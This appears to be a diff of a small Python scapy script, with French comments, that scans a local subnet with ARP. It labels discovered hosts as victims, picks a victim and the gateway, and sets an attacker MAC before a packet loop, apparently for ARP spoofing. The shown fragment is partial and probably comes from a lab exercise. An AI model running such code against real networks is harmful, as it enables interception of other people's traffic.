@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 from scapy.all import ARP, Ether, srp, get_if_hwaddr
 
-atk_mac = get_if_hwaddr("wlp0s20f3")
-
 packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24") # Cree les paquets
 
 victimes = [] # tableau des appareils presents
@@ -22,6 +20,7 @@ victime_mac = victimes['mac'][1]
 passerelle_ip = victimes['ip'][2]
 passerelle_mac = victimes['mac'][2]
 
+atk_mac = '08:00:27:c0:36:64'
 
 nb_packets = 0
 while nb_packets < 100:
